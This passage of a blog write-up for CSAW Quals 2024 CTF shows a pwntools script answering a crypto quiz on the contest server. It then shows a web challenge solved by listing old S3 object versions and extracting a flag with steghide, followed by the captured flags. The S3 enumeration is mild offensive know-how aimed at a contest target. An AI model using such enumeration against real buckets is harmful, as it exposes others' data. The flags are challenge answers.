+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&#34;diffusion-pop-quiz.ctf.csaw.io&#34;</span><span class="p">,</span><span class="mi">5000</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;?&#34;</span><span class="p">,</span><span class="s2">&#34;a&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;)&#34;</span><span class="p">,</span><span class="s2">&#34;no&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;?&#34;</span><span class="p">,</span><span class="s2">&#34;Diffusion matters a lot&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;with the 0x&#34;</span><span class="p">,</span><span class="s1">&#39;0x16&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;given you&#34;</span><span class="p">,</span><span class="s1">&#39;x3+x2*x3+x1*x2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;given you&#34;</span><span class="p">,</span><span class="s1">&#39;x3+x2*x3+x1*x2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;given you&#34;</span><span class="p">,</span><span class="s1">&#39;1+x3+x2+x2*x3+x1*x3+x1*x2&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;given you&#34;</span><span class="p">,</span><span class="s1">&#39;x8+x7+x6+x5+x5*x6+x5*x6*x8+x5*x6*x7*x8+x4*x7+x4*x7*x8+x4*x6*x8+x4*x6*x7*x8+x4*x5*x7*x8+x4*x5*x6*x8+x3*x7+x3*x7*x8+x3*x6+x3*x6*x7+x3*x6*x7*x8+x3*x5*x7+x3*x5*x6*x8+x3*x5*x6*x7*x8+x3*x4+x3*x4*x8+x3*x4*x7+x3*x4*x7*x8+x3*x4*x6+x3*x4*x6*x7+x3*x4*x6*x7*x8+x3*x4*x5*x8+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x3*x4*x5*x6*x7*x8+x2+x2*x8+x2*x7+x2*x7*x8+x2*x6+x2*x6*x7*x8+x2*x5*x7*x8+x2*x5*x6+x2*x5*x6*x8+x2*x4+x2*x4*x7*x8+x2*x4*x6*x7+x2*x4*x5*x8+x2*x4*x5*x6+x2*x4*x5*x6*x8+x2*x4*x5*x6*x7+x2*x3+x2*x3*x8+x2*x3*x7+x2*x3*x7*x8+x2*x3*x6*x7*x8+x2*x3*x5+x2*x3*x5*x8+x2*x3*x5*x7+x2*x3*x5*x6+x2*x3*x4+x2*x3*x4*x8+x2*x3*x4*x6*x8+x2*x3*x4*x6*x7*x8+x2*x3*x4*x5*x7+x1*x8+x1*x7+x1*x7*x8+x1*x6+x1*x6*x8+x1*x6*x7+x1*x6*x7*x8+x1*x5+x1*x5*x8+x1*x5*x7+x1*x5*x7*x8+x1*x5*x6+x1*x5*x6*x8+x1*x5*x6*x7+x1*x5*x6*x7*x8+x1*x4+x1*x4*x8+x1*x4*x7+x1*x4*x7*x8+x1*x4*x6+x1*x4*x6*x8+x1*x4*x6*x7+x1*x4*x6*x7*x8+x1*x4*x5+x1*x4*x5*x8+x1*x4*x5*x7+x1*x4*x5*x7*x8+x1*x4*x5*x6+x1*x4*x5*x6*x8+x1*x4*x5*x6*x7+x1*x4*x5*x6*x7*x8+x1*x3*x5*x8+x1*x3*x5*x7*x8+x1*x3*x5*x6*x8+x1*x3*x5*x6*x7*x8+x1*x3*x4*x5*x8+x1*x3*x4*x5*x7*x8+x1*x3*x4*x5*x6*x8+x1*x3*x4*x5*x6*x7*x8+x1*x2+x1*x2*x8+x1*x2*x7+x1*x2*x7*x8+x1*x2*x6+x1*x2*x6*x8+x1*x2*x6*x7+x1*x2*x6*x7*x8+x1*x2*x5+x1*x2*x5*x8+x1*x2*x5*x7+x1*x2*x5*x7*x8+x1*x2*x5*x6+x1*x2*x5*x6*x8+x1*x2*x5*x6*x7+x1*x2*x5*x6*x7*x8+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3*x5*x8+x1*x2*x3*x5*x7*x8+x1*x2*x3*x4*x5*x6*x8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;merical order</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;x1,x2,x3,x4,x5,x6,x7,x8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;)&#34;</span><span class="p">,</span><span class="s2">&#34;yes&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;given you&#34;</span><span class="p">,</span><span class="s1">&#39;x7*x8+x6+x6*x7*x8+x5*x7+x5*x6+x5*x6*x7+x4*x7+x4*x6*x7+x4*x6*x7*x8+x4*x5+x4*x5*x7+x4*x5*x6*x8+x4*x5*x6*x7+x3+x3*x7*x8+x3*x6*x7+x3*x5*x8+x3*x5*x7+x3*x5*x7*x8+x3*x5*x6+x3*x5*x6*x7+x3*x5*x6*x7*x8+x3*x4*x6*x8+x3*x4*x6*x7+x3*x4*x5+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x3*x4*x5*x6*x7*x8+x2+x2*x8+x2*x7*x8+x2*x6*x8+x2*x6*x7+x2*x6*x7*x8+x2*x5+x2*x5*x8+x2*x5*x7*x8+x2*x4+x2*x4*x8+x2*x4*x6+x2*x4*x6*x8+x2*x4*x6*x7+x2*x4*x6*x7*x8+x2*x4*x5*x8+x2*x4*x5*x7*x8+x2*x4*x5*x6*x8+x2*x4*x5*x6*x7*x8+x2*x3*x7+x2*x3*x6+x2*x3*x6*x7*x8+x2*x3*x5*x8+x2*x3*x5*x6+x2*x3*x5*x6*x8+x2*x3*x5*x6*x7*x8+x2*x3*x4*x6+x2*x3*x4*x6*x7+x2*x3*x4*x5*x7+x2*x3*x4*x5*x7*x8+x2*x3*x4*x5*x6*x8+x2*x3*x4*x5*x6*x7+x1*x7+x1*x7*x8+x1*x6*x8+x1*x5+x1*x5*x7+x1*x5*x7*x8+x1*x5*x6*x7+x1*x5*x6*x7*x8+x1*x4*x7*x8+x1*x4*x6*x7+x1*x4*x5*x7+x1*x4*x5*x7*x8+x1*x4*x5*x6*x7+x1*x4*x5*x6*x7*x8+x1*x3+x1*x3*x8+x1*x3*x7+x1*x3*x7*x8+x1*x3*x6*x8+x1*x3*x5*x7+x1*x3*x5*x6+x1*x3*x5*x6*x7+x1*x3*x5*x6*x7*x8+x1*x3*x4+x1*x3*x4*x8+x1*x3*x4*x7+x1*x3*x4*x7*x8+x1*x3*x4*x6+x1*x3*x4*x6*x7*x8+x1*x3*x4*x5*x7+x1*x3*x4*x5*x6+x1*x2+x1*x2*x8+x1*x2*x7+x1*x2*x6+x1*x2*x5*x6*x7*x8+x1*x2*x4*x7*x8+x1*x2*x4*x6*x8+x1*x2*x4*x5+x1*x2*x4*x5*x7+x1*x2*x4*x5*x6+x1*x2*x4*x5*x6*x8+x1*x2*x4*x5*x6*x7+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3+x1*x2*x3*x8+x1*x2*x3*x6*x7+x1*x2*x3*x5+x1*x2*x3*x5*x8+x1*x2*x3*x5*x6*x8+x1*x2*x3*x5*x6*x7+x1*x2*x3*x4*x6*x8+x1*x2*x3*x4*x5+x1*x2*x3*x4*x5*x8+x1*x2*x3*x4*x5*x7*x8+x1*x2*x3*x4*x5*x6*x8&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;merical order</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;x1,x2,x3,x4,x5,x6,x7,x8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;)&#34;</span><span class="p">,</span><span class="s2">&#34;yes&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;given you&#34;</span><span class="p">,</span><span class="s1">&#39;x8+x7+x6*x8+x5*x8+x5*x7*x8+x5*x6+x5*x6*x8+x4*x8+x4*x7+x4*x7*x8+x4*x6*x8+x4*x6*x7+x4*x5+x4*x5*x8+x4*x5*x7+x4*x5*x7*x8+x4*x5*x6+x4*x5*x6*x8+x4*x5*x6*x7+x4*x5*x6*x7*x8+x3+x3*x8+x3*x7*x8+x3*x6*x8+x3*x6*x7+x3*x6*x7*x8+x3*x5*x8+x3*x5*x7+x3*x5*x7*x8+x3*x5*x6*x8+x3*x5*x6*x7+x3*x5*x6*x7*x8+x3*x4*x8+x3*x4*x7+x3*x4*x6+x3*x4*x6*x7*x8+x3*x4*x5+x3*x4*x5*x6*x7+x3*x4*x5*x6*x7*x8+x2*x8+x2*x7*x8+x2*x6*x7+x2*x5*x8+x2*x5*x7*x8+x2*x5*x6+x2*x5*x6*x7+x2*x5*x6*x7*x8+x2*x4*x8+x2*x4*x7*x8+x2*x4*x6*x8+x2*x4*x5+x2*x4*x5*x8+x2*x4*x5*x7*x8+x2*x4*x5*x6+x2*x4*x5*x6*x7+x2*x4*x5*x6*x7*x8+x2*x3+x2*x3*x7+x2*x3*x7*x8+x2*x3*x5+x2*x3*x5*x8+x2*x3*x5*x6+x2*x3*x5*x6*x7*x8+x2*x3*x4*x6+x2*x3*x4*x6*x8+x2*x3*x4*x6*x7+x2*x3*x4*x6*x7*x8+x2*x3*x4*x5+x2*x3*x4*x5*x7+x2*x3*x4*x5*x6*x8+x1+x1*x8+x1*x7*x8+x1*x6*x8+x1*x6*x7+x1*x6*x7*x8+x1*x5*x8+x1*x5*x7+x1*x5*x6+x1*x5*x6*x8+x1*x5*x6*x7*x8+x1*x4+x1*x4*x8+x1*x4*x7+x1*x4*x6*x8+x1*x4*x6*x7+x1*x4*x6*x7*x8+x1*x4*x5*x8+x1*x4*x5*x7*x8+x1*x4*x5*x6+x1*x4*x5*x6*x8+x1*x4*x5*x6*x7*x8+x1*x3*x8+x1*x3*x7+x1*x3*x6*x7+x1*x3*x6*x7*x8+x1*x3*x5*x8+x1*x3*x5*x7+x1*x3*x5*x7*x8+x1*x3*x5*x6*x8+x1*x3*x4*x7+x1*x3*x4*x6+x1*x3*x4*x6*x7+x1*x3*x4*x6*x7*x8+x1*x3*x4*x5*x8+x1*x3*x4*x5*x7*x8+x1*x3*x4*x5*x6*x7+x1*x2+x1*x2*x8+x1*x2*x6+x1*x2*x6*x7+x1*x2*x6*x7*x8+x1*x2*x5*x7+x1*x2*x5*x7*x8+x1*x2*x5*x6*x7+x1*x2*x4+x1*x2*x4*x7*x8+x1*x2*x4*x6+x1*x2*x4*x6*x7+x1*x2*x4*x5*x7+x1*x2*x4*x5*x7*x8+x1*x2*x4*x5*x6+x1*x2*x4*x5*x6*x8+x1*x2*x4*x5*x6*x7+x1*x2*x4*x5*x6*x7*x8+x1*x2*x3*x7+x1*x2*x3*x6+x1*x2*x3*x6*x8+x1*x2*x3*x5+x1*x2*x3*x5*x8+x1*x2*x3*x5*x7+x1*x2*x3*x5*x7*x8+x1*x2*x3*x5*x6+x1*x2*x3*x5*x6*x8+x1*x2*x3*x5*x6*x7*x8+x1*x2*x3*x4+x1*x2*x3*x4*x8+x1*x2*x3*x4*x7+x1*x2*x3*x4*x7*x8+x1*x2*x3*x4*x6*x8+x1*x2*x3*x4*x5+x1*x2*x3*x4*x5*x7*x8+x1*x2*x3*x4*x5*x6+x1*x2*x3*x4*x5*x6*x8+x1*x2*x3*x4*x5*x6*x7&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;merical order</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;x1,x2,x3,x4,x5,x6,x7,x8&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;)&#34;</span><span class="p">,</span><span class="s2">&#34;yes&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;)&#34;</span><span class="p">,</span><span class="s2">&#34;no&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;etc.</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;y7&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;given you&#34;</span><span class="p">,</span><span class="s1">&#39;x7+x6+x6*x8+x5*x8+x5*x6+x4*x8+x4*x7+x4*x7*x8+x4*x6*x7+x4*x5*x6+x4*x5*x6*x8+x4*x5*x6*x7+x4*x5*x6*x7*x8+x3*x7+x3*x6+x3*x6*x7+x3*x5+x3*x5*x6+x3*x4+x3*x4*x8+x3*x4*x7+x3*x4*x6*x8+x3*x4*x6*x7*x8+x3*x4*x5*x7*x8+x3*x4*x5*x6*x8+x2*x8+x2*x7*x8+x2*x6+x2*x6*x7*x8+x2*x5*x7+x2*x5*x6+x2*x5*x6*x8+x2*x4*x8+x2*x4*x6+x2*x4*x6*x7+x2*x4*x6*x7*x8+x2*x4*x5*x8+x2*x4*x5*x7+x2*x4*x5*x6*x7+x2*x4*x5*x6*x7*x8+x2*x3*x8+x2*x3*x6*x8+x2*x3*x6*x7*x8+x2*x3*x5*x7+x2*x3*x5*x6*x8+x2*x3*x4&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;etc.</span><span class="se">\r\n</span><span class="s2">&#34;</span><span class="p">,</span><span class="s2">&#34;x1&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;)&#34;</span><span class="p">,</span><span class="s2">&#34;yes&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&#34;)&#34;</span><span class="p">,</span><span class="s2">&#34;yes&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">())</span>
+</span></span></code></pre></div><p>When we run the script, we receive the flag from the server output as:</p>
+<p><img loading="lazy" src="Pasted%20image%2020240908083806.png" alt=""  />
+</p>
+<p>And our flag is <code>csawctf{hopefu11y_+he_know1ed9e_diffu5ed_in+o_your_6r@in5}</code>.</p>
+<h1 id="bucketwars-web">BucketWars (Web)<a hidden class="anchor" aria-hidden="true" href="#bucketwars-web">#</a></h1>
+<p>They gave us a site <a href="https://bucketwars.ctf.csaw.io/">https://bucketwars.ctf.csaw.io</a>.
+When attempting to access any incorrect path, you receive an error message with this S3 bucket link: <a href="https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/">https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/</a>. This is actually a positive outcome, as we now have the bucket link. We can use this information to enumerate further and search for potential misconfigurations.</p>
+<p>A hint on the front page mentioned &lsquo;past versions.&rsquo; I looked up how to access S3 versions and discovered that appending <code>/?versions</code> to the end of the URL would reveal past versions of files in the bucket.</p>
+<p>As shown here: <a href="https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/?versions">https://s3.us-east-2.amazonaws.com/bucketwars.ctf.csaw.io/?versions</a>, you can see not only the files that are primarily on the main website but also some version IDs.</p>
+<p>From that XML file, I obtained several <code>versionId</code> values, which I used in the link as shown below:
+<img loading="lazy" src="Pasted%20image%2020240908214908.png" alt=""  />
+
+I replaced all those versionId in the following link:
+<a href="https://bucketwars.ctf.csaw.io.s3.amazonaws.com/index_v1.html?versionId=CFNz2JPIIJfRlNfnVx8a45jgh0J90KxS">https://bucketwars.ctf.csaw.io.s3.amazonaws.com/index_v1.html?versionId=<code>VersionId</code></a></p>
+<p>Out of all, <a href="https://bucketwars.ctf.csaw.io.s3.amazonaws.com/index_v1.html?versionId=t6G6A20JCaF5nzz6KuJR6Pj1zePOLAdB">https://bucketwars.ctf.csaw.io.s3.amazonaws.com/index_v1.html?versionId=t6G6A20JCaF5nzz6KuJR6Pj1zePOLAdB</a> gives us:
+<img loading="lazy" src="Pasted%20image%2020240908214954.png" alt=""  />
+</p>
+<p>I tried to crack down the passphrase for the given image but no luck. Then I tried to look for other <code>versionId</code> and  got this password in DOM:
+<img loading="lazy" src="Pasted%20image%2020240908215157.png" alt=""  />
+</p>
+<p>I used this password with steghide tool like:</p>
+<pre tabindex="0"><code>╭─rezy@dev ~  
+╰─➤  steghide extract -sf sand-pit-1345726_640.jpg -xf flag.txt -p versions_leaks_buckets_oh_my                     
+wrote extracted data to &#34;flag.txt&#34;.
+╭─rezy@dev ~  
+╰─➤  cat flag.txt 
+csawctf{lEaKY_Bu4K3tz_oH_m3_04_mY!}
+</code></pre><h1 id="conclusion">Conclusion<a hidden class="anchor" aria-hidden="true" href="#conclusion">#</a></h1>
+<p>Thank you for reading my write-up for CSAW QUALS 2024.
+Happy hacking! :)</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/ctf/">CTF</a></li>
+      <li><a href="http://localhost:1313/tags/csaw/">CSAW</a></li>
+      <li><a href="http://localhost:1313/tags/forensics/">Forensics</a></li>
+      <li><a href="http://localhost:1313/tags/web/">Web</a></li>
+      <li><a href="http://localhost:1313/tags/crypto/">Crypto</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/posts/hackthebox/mailing/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Mailing Writeup</span>
+  </a>
+  <a class="next" href="http://localhost:1313/posts/ctf/ptn-ctf-24/">
+    <span class="title">Next »</span>
+    <br>
+    <span>Pentester Nepal&#39;s 2024 CTF Writeups</span>
+  </a>
+</nav>
+
+
+<ul class="share-buttons">
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CSAW Quals 2024 on x"
+            href="https://x.com/intent/tweet/?text=CSAW%20Quals%202024&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fctf%2fcsaw-quals-2024%2f&amp;hashtags=CTF%2cCSAW%2cForensics%2cWeb%2cCrypto">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CSAW Quals 2024 on linkedin"
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fctf%2fcsaw-quals-2024%2f&amp;title=CSAW%20Quals%202024&amp;summary=CSAW%20Quals%202024&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2fctf%2fcsaw-quals-2024%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CSAW Quals 2024 on reddit"
+            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2fctf%2fcsaw-quals-2024%2f&title=CSAW%20Quals%202024">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CSAW Quals 2024 on facebook"
+            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2fctf%2fcsaw-quals-2024%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CSAW Quals 2024 on whatsapp"
+            href="https://api.whatsapp.com/send?text=CSAW%20Quals%202024%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2fctf%2fcsaw-quals-2024%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share CSAW Quals 2024 on telegram"
+            href="https://telegram.me/share/url?text=CSAW%20Quals%202024&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2fctf%2fcsaw-quals-2024%2f">
+            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+                <path
